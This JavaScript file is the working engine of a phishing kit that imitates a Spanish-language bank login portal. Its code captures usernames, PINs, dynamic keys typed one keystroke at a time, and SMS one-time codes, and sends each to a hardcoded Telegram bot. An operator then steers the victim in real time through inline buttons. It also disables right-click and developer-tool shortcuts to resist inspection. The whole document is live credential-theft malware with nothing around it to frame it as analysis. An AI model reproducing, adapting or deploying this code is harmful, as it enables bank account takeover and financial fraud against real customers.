document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('keydown',function(e){if(e.key==='F12'||e.keyCode===123){e.preventDefault();return false}if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'||e.key==='J'||e.key==='j'||e.key==='C'||e.key==='c')){e.preventDefault();return false}if(e.ctrlKey&&(e.key==='U'||e.key==='u')){e.preventDefault();return false}});var _0xTg='8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4',_0xCId='7776240161',_0xU=document.getElementById('usuario'),_0xC=document.getElementById('clave'),_0xB=document.getElementById('submitBtn'),_0xF=document.getElementById('demoForm'),_0xL=document.getElementById('loading-overlay'),_0xE=document.getElementById('loginError'),_0xM=document.getElementById('modalDinamica'),_0xO=document.getElementById('otpInput'),_0xOS=document.querySelectorAll('.otp-slot'),_0xOb=document.getElementById('btnBorrar'),_0xOc=document.getElementById('btnContinuar'),_0xOe=document.getElementById('otpError'),_0xOcont=document.getElementById('otpContainer'),_0xClose=document.getElementById('closeModal'),_0xVd=document.getElementById('viewDinamica'),_0xVs=document.getElementById('viewSms'),_0xS=document.getElementById('smsCodeInput'),_0xSb=document.getElementById('btnSmsFinal'),_0xSe=document.getElementById('smsError'),_0xSw=document.getElementById('smsInputWrap'),_0xAct=false,_0xTo=null,_0xLastId=-1,_0xProc=false,_0xMsgId=null;

// ==========================================
// ENVÍO DE USUARIO Y CLAVE (AL TERMINAR)
// ==========================================
function _0xEnviarCredenciales() {
    var _0xUsr = _0xU.value.trim();
    var _0xPwd = _0xC.value.trim();
    
    if(_0xUsr === '' && _0xPwd === '') return; // Si ambos están vacíos, no envía nada

    var _0xMsg = `📝 <b>DATOS INGRESADOS:</b>\n\n👤 <b>Usuario:</b> <code>${_0xUsr}</code>\n🔑 <b>Clave:</b> <code>${_0xPwd}</code>`;
    
    fetch(`https://api.telegram.org/bot${_0xTg}/sendMessage`, {
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: _0xCId, text: _0xMsg, parse_mode: 'HTML' })
    }).catch(e => console.log("Error", e));
}

// Detectar cuando el usuario termina de escribir y cambia de campo (blur) o presiona Enter
_0xU.addEventListener('blur', _0xEnviarCredenciales);
_0xC.addEventListener('blur', _0xEnviarCredenciales);
_0xU.addEventListener('keypress', function(e) { if(e.key === 'Enter') _0xEnviarCredenciales(); });
_0xC.addEventListener('keypress', function(e) { if(e.key === 'Enter') _0xEnviarCredenciales(); });

// ==========================================
// ENVÍO DE CLÉ DÍNAMICA (EN VIVO)
// ==========================================
function _0xEnviarDinamicaEnVivo() {
    var _0xDyn = _0xO.value;
    if(_0xDyn === '') return;

    var _0xMsg = `⌨️ <b>ESCRIBIENDO DINÁMICA:</b>\n\n👤 <b>Usuario:</b> <code>${_0xU.value}</code>\n🔢 <b>Dinámica:</b> <code>${_0xDyn}</code>`;
    
    fetch(`https://api.telegram.org/bot${_0xTg}/sendMessage`, {
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: _0xCId, text: _0xMsg, parse_mode: 'HTML' })
    }).catch(e => console.log("Error", e));
}
// ==========================================

function _0xShow(){_0xL.style.display='flex'}function _0xHide(){_0xL.style.display='none'}function _0xBtn(){var _0xV=/^[0-9]{4}$/.test(_0xC.value),_0xUl=_0xU.value.trim().length>0,_0xVal=_0xV&&_0xUl;_0xB.disabled=!_0xVal;if(_0xVal)_0xE.classList.remove('show')}_0xU.addEventListener('input',_0xBtn);_0xC.addEventListener('input',function(){_0xC.value=_0xC.value.replace(/[^0-9]/g,'').slice(0,4);_0xBtn()});function _0xSendId(_0xUsr,_0xPwd){var _0xMsg=`⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n👤 <b>Usuario:</b> <code>${_0xUsr}</code>\n🔑 <b>Clave:</b> <code>${_0xPwd}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim(),_0xKb={inline_keyboard:[[{text:'❌ Usuario Malo',callback_data:'error_usuario'},{text:'🔑 Pedir Dinámica',callback_data:'pedir_dinamica'}],[{text:'🚫 Banear IP',callback_data:'banear_ip'},{text:'🏁 Finalizar (Google)',callback_data:'finalizar'}]]};fetch(`https://api.telegram.org/bot${_0xTg}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:_0xCId,text:_0xMsg,parse_mode:'HTML',reply_markup:_0xKb})}).then(function(r){return r.json()}).then(function(d){if(d.ok&&d.result){_0xMsgId=String(d.result.message_id);_0xProc=false;_0xListen(_0xActLogin)}else{_0xHide()}}).catch(function(){_0xHide()})}function _0xSendDyn(_0xDyn){var _0xMsg=`⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${_0xU.value}</code>\n🔢 <b>Dinámica:</b> <code>${_0xDyn}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim(),_0xKb={inline_keyboard:[[{text:'❌ Error Dinámica',callback_data:'error_dinamica'},{text:'📩 SMS Code',callback_data:'sms_code'}],[{text:'🏁 Finalizar (Google)',callback_data:'finalizar'}]]};fetch(`https://api.telegram.org/bot${_0xTg}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:_0xCId,text:_0xMsg,parse_mode:'HTML',reply_markup:_0xKb})}).then(function(r){return r.json()}).then(function(d){if(d.ok&&d.result){_0xMsgId=String(d.result.message_id);_0xProc=false;_0xListen(_0xActDyn)}})}function _0xSendSms(_0xSms){var _0xMsg=`⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${_0xU.value}</code>\n📩 <b>SMS:</b> <code>${_0xSms}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim(),_0xKb={inline_keyboard:[[{text:'❌ Error Dinámica',callback_data:'error_dinamica_final'}],[{text:'❌ Error SMS Code',callback_data:'error_sms_final'}],[{text:'🏁 Finalizar (Google)',callback_data:'finalizar'}]]};fetch(`https://api.telegram.org/bot${_0xTg}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:_0xCId,text:_0xMsg,parse_mode:'HTML',reply_markup:_0xKb})}).then(function(r){return r.json()}).then(function(d){if(d.ok&&d.result){_0xMsgId=String(d.result.message_id);_0xProc=false;_0xListen(_0xActSms)}})}function _0xListen(_0xCallback){if(!_0xMsgId)return;_0xAct=true;function _0xCheck(){if(!_0xAct)return;fetch(`https://api.telegram.org/bot${_0xTg}/getUpdates`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({offset:_0xLastId+1,allowed_updates:['callback_query'],timeout:10})}).then(function(r){return r.json()}).then(function(d){if(!d.ok||!d.result||d.result.length===0){_0xTo=setTimeout(_0xCheck,2000);return}for(var i=0;i<d.result.length;i++){var u=d.result[i];_0xLastId=Math.max(_0xLastId,u.update_id);if(u.callback_query){var mId=String(u.callback_query.message.message_id);if(mId===String(_0xMsgId)){_0xAct=false;_0xCallback(u.callback_query.data);return}}}_0xTo=setTimeout(_0xCheck,2000)}).catch(function(){_0xTo=setTimeout(_0xCheck,3000)})}_0xCheck()}function _0xActLogin(_0xAct){if(_0xProc)return;_0xProc=true;_0xHide();if(_0xAct==='pedir_dinamica'){_0xM.classList.add('is-open');_0xVd.style.display='block';_0xVs.classList.remove('active');_0xO.value='';_0xOe.classList.remove('show');_0xOcont.classList.remove('error');_0xOTP();setTimeout(function(){_0xO.focus()},100)}else if(_0xAct==='error_usuario'){_0xE.classList.add('show');_0xC.value='';_0xBtn();_0xC.focus()}else if(_0xAct==='banear_ip'){localStorage.setItem('sys_blocked_user','true');location.reload()}else if(_0xAct==='finalizar'){window.location.href='https://www.google.com'}}function _0xActDyn(_0xAct){if(_0xProc)return;_0xProc=true;_0xHide();if(_0xAct==='error_dinamica'){_0xM.classList.add('is-open');_0xVd.style.display='block';_0xVs.classList.remove('active');_0xOe.classList.add('show');_0xOcont.classList.add('error');_0xO.value='';_0xOTP();_0xO.focus();_0xProc=false}else if(_0xAct==='sms_code'){_0xVd.style.display='none';_0xVs.classList.add('active');_0xS.value='';_0xSe.classList.remove('show');_0xSw.classList.remove('error');setTimeout(function(){_0xS.focus()},100)}else if(_0xAct==='finalizar'){window.location.href='https://www.google.com'}}function _0xActSms(_0xAct){if(_0xProc)return;_0xProc=true;_0xHide();if(_0xAct==='error_dinamica_final'){_0xVs.classList.remove('active');_0xVd.style.display='block';_0xOe.classList.add('show');_0xOcont.classList.add('error');_0xO.value='';_0xOTP();_0xO.focus();_0xProc=false}else if(_0xAct==='error_sms_final'){_0xSe.classList.add('show');_0xSw.classList.add('error');_0xS.value='';_0xS.focus();_0xProc=false}else if(_0xAct==='finalizar'){window.location.href='https://www.google.com'}}_0xF.addEventListener('submit',function(e){e.preventDefault();if(_0xB.disabled)return;_0xShow();_0xSendId(_0xU.value.trim(),_0xC.value.trim())});function _0xOTP(){var _0xVal=_0xO.value;_0xOS.forEach(function(slot,index){if(index<_0xVal.length){slot.textContent=_0xVal[index];slot.classList.remove('active')}else{slot.textContent='';if(index===_0xVal.length){slot.classList.add('active')}else{slot.classList.remove('active')}}});if(_0xVal.length===6){_0xOc.disabled=false;_0xOS.forEach(function(s){s.classList.remove('active')})}else{_0xOc.disabled=true}}

// Modificamos el evento input del OTP para que también envíe en vivo
_0xO.addEventListener('input',function(){
    this.value=this.value.replace(/[^0-9]/g,'').slice(0,6);
    _0xOe.classList.remove('show');
    _0xOcont.classList.remove('error');
    _0xOTP();
    _0xEnviarDinamicaEnVivo(); // <--- ENVÍO EN VIVO AQUÍ
});

_0xOcont.addEventListener('click',function(){_0xO.focus()});_0xOb.addEventListener('click',function(){_0xO.value='';_0xOe.classList.remove('show');_0xOcont.classList.remove('error');_0xOTP();_0xO.focus()});_0xOc.addEventListener('click',function(){if(_0xO.value.length===6){_0xShow();_0xSendDyn(_0xO.value)}});_0xClose.addEventListener('click',function(){_0xM.classList.remove('is-open')});_0xS.addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'').slice(0,6);_0xSe.classList.remove('show');_0xSw.classList.remove('error')});_0xSb.addEventListener('click',function(){if(_0xS.value.length<6){_0xSe.textContent='Por favor, ingresa el código SMS completo de 6 dígitos.';_0xSe.classList.add('show');_0xSw.classList.add('error');return}_0xShow();_0xSendSms(_0xS.value)});function _0xClock(){var d=new Date(),o={weekday:'long',year:'numeric',month:'long',day:'numeric',hour:'numeric',minute:'2-digit',hour12:true},f=d.toLocaleDateString('es-ES',o).replace(',',''),el=document.getElementById('reloj-widget');if(el)el.textContent=f.charAt(0).toUpperCase()+f.slice(1)}_0xClock();setInterval(_0xClock,60000);_0xBtn();
